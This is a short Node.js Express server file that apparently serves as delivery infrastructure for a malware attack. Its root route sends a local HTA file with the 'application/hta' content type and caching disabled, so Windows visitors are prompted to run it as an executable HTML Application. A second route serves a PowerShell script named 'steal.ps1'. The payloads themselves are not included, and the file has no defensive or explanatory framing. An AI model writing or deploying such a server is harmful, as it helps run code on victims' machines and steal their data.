// language: JavaScript, file: server.js, runtime: Node 18+
const express = require("express");
const path = require("path");

const app = express();
app.set("trust proxy", 1);

app.get("/", (req, res) => {
  res.setHeader("Content-Type", "application/hta");
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
  res.sendFile(path.join(__dirname, "file.hta"));
});

app.get("/steal.ps1", (req, res) => {
  res.setHeader("Content-Type", "text/plain");
  res.sendFile(path.join(__dirname, "steal.ps1"));
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", function() {
  console.log("Server running on port " + PORT);
});
